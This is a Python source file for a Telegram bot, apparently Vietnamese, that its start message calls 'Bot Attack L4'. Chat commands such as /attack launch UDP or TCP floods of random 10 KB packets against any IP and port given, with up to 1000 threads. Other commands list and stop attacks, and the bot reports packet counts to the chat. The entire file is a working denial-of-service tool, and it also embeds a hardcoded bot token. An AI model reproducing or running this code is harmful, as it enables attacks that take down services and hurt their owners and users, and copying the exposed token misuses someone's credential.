import socket
import threading
import random
import time
import telebot
import json
import os
from flask import Flask, jsonify
from datetime import datetime, timedelta

total_sent = 0
count_lock = threading.Lock()
TOKEN = os.environ.get('TOKEN', '8186042947:AAESvUaSbZtVRB_EBJGWUpmARVsyWvXq2H8')
bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)
start_time = datetime.now()
active_attacks = []
attack_lock = threading.Lock()

@app.route('/')
def home():
    return jsonify({"message": "Bot đang hoạt động!"})

def send_udp(ip, port, dur, stop_event):
    global total_sent
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = random._urandom(10240)
    timeout = time.time() + dur
    while time.time() < timeout and not stop_event.is_set():
        try:
            s.sendto(data, (ip, port))
            with count_lock:
                total_sent += 1
        except:
            continue

def send_tcp(ip, port, dur, stop_event):
    global total_sent
    timeout = time.time() + dur
    data = random._urandom(10240)
    while time.time() < timeout and not stop_event.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((ip, port))
            sock.send(data)
            sock.close()
            with count_lock:
                total_sent += 1
        except:
            continue

def stats(dur, chat_id, stop_event):
    global total_sent
    start = time.time()
    while time.time() - start < dur and not stop_event.is_set():
        time.sleep(10)
        with count_lock:
            status = {
                "Status": "Ongoing",
                "PacketsSent": total_sent,
                "TimeElapsed": round(time.time() - start, 2)
            }
            bot.send_message(chat_id, f"```json\n{json.dumps(status, indent=2, ensure_ascii=False)}\n```", parse_mode="Markdown")

def flood(ip, port, mode, concurrent, seconds, chat_id, username, attack_id, stop_event):
    global total_sent
    total_sent = 0
    start_info = {
        "Attack": "Started!",
        "Index": attack_id,
        "Caller": username,
        "Target": f"{ip}:{port}",
        "Mode": mode.upper(),
        "Duration": f"{seconds} seconds",
        "Threads": concurrent
    }
    bot.send_message(chat_id, f"```json\n{json.dumps(start_info, indent=2, ensure_ascii=False)}\n```", parse_mode="Markdown")
    flood_func = send_udp if mode == "udp" else send_tcp
    threading.Thread(target=stats, args=(seconds, chat_id, stop_event), daemon=True).start()
    thread_pool = []
    for _ in range(concurrent):
        th = threading.Thread(target=flood_func, args=(ip, port, seconds, stop_event))
        th.daemon = True
        th.start()
        thread_pool.append(th)
    for th in thread_pool:
        th.join()
    with attack_lock:
        if attack_id < len(active_attacks):
            active_attacks[attack_id]["active"] = False
    end_info = {
        "Attack": "Completed!",
        "Target": f"{ip}:{port}",
        "Mode": mode.upper(),
        "TotalPackets": total_sent
    }
    bot.send_message(chat_id, f"```json\n{json.dumps(end_info, indent=2, ensure_ascii=False)}\n```", parse_mode="Markdown")

@bot.message_handler(commands=['attack'])
def attack_command(message):
    try:
        args = message.text.split()[1:]
        if len(args) != 5:
            bot.reply_to(message, "```json\n{\"Usage\": \"/attack [ip] [port] [mode: udp/tcp] [seconds] [threads]\"}\n```", parse_mode="Markdown")
            return
        ip, port, mode, seconds, threads = args
        port = int(port)
        seconds = int(seconds)
        threads = int(threads)
        if mode not in ["udp", "tcp"]:
            bot.reply_to(message, "```json\n{\"Error\": \"Mode must be 'udp' or 'tcp'\"}\n```", parse_mode="Markdown")
            return
        if threads < 1 or threads > 1000:
            bot.reply_to(message, "```json\n{\"Error\": \"Threads must be between 1 and 1000\"}\n```", parse_mode="Markdown")
            return
        username = message.from_user.username or message.from_user.first_name
        stop_event = threading.Event()
        with attack_lock:
            attack_id = len(active_attacks)
            active_attacks.append({
                "id": attack_id,
                "ip": ip,
                "port": port,
                "mode": mode,
                "duration": seconds,
                "threads": threads,
                "user": username,
                "start": str(datetime.now()),
                "active": True,
                "stop_event": stop_event
            })
        threading.Thread(target=flood, args=(ip, port, mode, threads, seconds, message.chat.id, username, attack_id, stop_event)).start()
    except Exception as e:
        bot.reply_to(message, f"```json\n{{\"Error\": \"{str(e)}\"}}\n```", parse_mode="Markdown")

@bot.message_handler(commands=['list'])
def list_command(message):
    with attack_lock:
        data = []
        for attack in active_attacks:
            if attack["active"]:
                data.append({
                    "Index": attack["id"],
                    "User": attack["user"],
                    "Target": f"{attack['ip']}:{attack['port']}",
                    "Mode": attack["mode"],
                    "Duration": attack["duration"],
                    "Threads": attack["threads"],
                    "Start": attack["start"]
                })
        bot.reply_to(message, f"```json\n{json.dumps({'ActiveAttacks': data}, indent=2, ensure_ascii=False)}\n```", parse_mode="Markdown")

@bot.message_handler(commands=['stop'])
def stop_command(message):
    try:
        args = message.text.split()
        if len(args) != 2:
            bot.reply_to(message, "```json\n{\"Usage\": \"/stop [index]\"}\n```", parse_mode="Markdown")
            return
        index = int(args[1])
        with attack_lock:
            if index >= len(active_attacks) or not active_attacks[index]["active"]:
                bot.reply_to(message, f"```json\n{{\"Error\": \"No active attack at index {index}\"}}\n```", parse_mode="Markdown")
                return
            active_attacks[index]["stop_event"].set()
            active_attacks[index]["active"] = False
        bot.reply_to(message, f"```json\n{{\"Message\": \"Stopped attack {index}\"}}\n```", parse_mode="Markdown")
    except Exception as e:
        bot.reply_to(message, f"```json\n{{\"Error\": \"{str(e)}\"}}\n```", parse_mode="Markdown")

@bot.message_handler(commands=['uptime'])
def uptime_command(message):
    uptime = datetime.now() - start_time
    days = uptime.days
    hours, remainder = divmod(uptime.seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    uptime_info = {
        "Uptime": {
            "Days": days,
            "Hours": hours,
            "Minutes": minutes,
            "Seconds": seconds
        }
    }
    bot.reply_to(message, f"```json\n{json.dumps(uptime_info, indent=2, ensure_ascii=False)}\n```", parse_mode="Markdown")

@bot.message_handler(commands=['start'])
def start_command(message):
    intro = {
        "Message": "Chào mừng bạn đến với Bot Attack L4",
        "Owner": "Vũ Xuân Kiên (@xkprj)",
        "Commands": {
            "/attack [ip] [port] [mode: udp/tcp] [seconds] [threads]": "Tấn công IP",
            "/list": "Hiển thị danh sách tấn công đang chạy",
            "/stop [index]": "Dừng cuộc tấn công theo index",
            "/uptime": "Xem thời gian bot hoạt động",
            "/start": "Giới thiệu bot và danh sách lệnh"
        }
    }
    bot.reply_to(message, f"```json\n{json.dumps(intro, indent=2, ensure_ascii=False)}\n```", parse_mode="Markdown")

def run_bot():
    bot.polling()

def run_flask():
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))

if __name__ == '__main__':
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    flask_thread.start()
    bot_thread.start()
    flask_thread.join()
    bot_thread.join()
